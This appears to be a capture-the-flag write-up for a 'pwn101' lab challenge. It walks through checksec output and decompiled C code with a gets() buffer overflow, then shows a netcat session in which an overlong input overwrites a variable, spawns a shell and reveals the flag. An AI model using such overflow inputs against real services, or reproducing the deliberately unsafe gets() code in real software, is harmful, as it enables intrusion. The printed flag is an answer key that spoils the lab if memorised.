# pwn101

nc 10.10.47.113 9001

decription: This should give you a start: 'AAAAAAAAAAA'

```bash
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/pwn101]
└─$ file pwn101-1644307211706.pwn101
pwn101-1644307211706.pwn101: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=dd42eee3cfdffb116dfdaa750dbe4cc8af68cf43, not stripped
```

```bash
┌──(zeqzoq㉿zeqzoq)-[/mnt/c/Users/hzqzz/Downloads/pwn101]
└─$ checksec pwn101-1644307211706.pwn101
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/zeqzoq/.cache/.pwntools-cache-3.12/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.13.1 --> 4.14.1).
    Update with: $ pip install -U pwntools
[*] '/mnt/c/Users/hzqzz/Downloads/pwn101/pwn101-1644307211706.pwn101'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[60]; // [rsp+0h] [rbp-40h] BYREF
  int v5; // [rsp+3Ch] [rbp-4h]

  v5 = 1337;
  setup();
  banner(argc, argv);
  puts(
    "Hello!, I am going to shopping.\n"
    "My mom told me to buy some ingredients.\n"
    "Ummm.. But I have low memory capacity, So I forgot most of them.\n"
    "Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D\n");
  puts("Type the required ingredients to make briyani: ");
  gets(v4);
  if ( v5 == 1337 )
  {
    puts("Nah bruh, you lied me :(\nShe did Tomato rice instead of briyani :/");
    exit(1337);
  }
  puts("Thanks, Here's a small gift for you <3");
  return system("/bin/sh");
}
```

Looking at the source code, we just need the v5 ≠ 1337 to get `return system("/bin/sh");`

We can see that v4 is 60 bytes and the code use gets(v4) which is vulnerable. For this, we just need to overflow v4 past 60 bytes to overwrite v5. Based on the challenge description "AAAAAAAAAAA" then I just put more A's. and get bin shell, reading the flag.txt.

```bash
┌──(zeqzoq㉿zeqzoq)-[~]
└─$ nc 10.10.47.113 9001
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 101

Hello!, I am going to shopping.
My mom told me to buy some ingredients.
Ummm.. But I have low memory capacity, So I forgot most of them.
Anyway, she is preparing Briyani for lunch, Can you help me to buy those items :D

Type the required ingredients to make briyani:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thanks, Here's a small gift for you <3
whoami
pwn101
ls
flag.txt
pwn101
pwn101.c
cat flag.txt
THM{7h4t's_4n_3zy_oveRflowwwww}
```

```
THM{7h4t's_4n_3zy_oveRflowwwww}
```
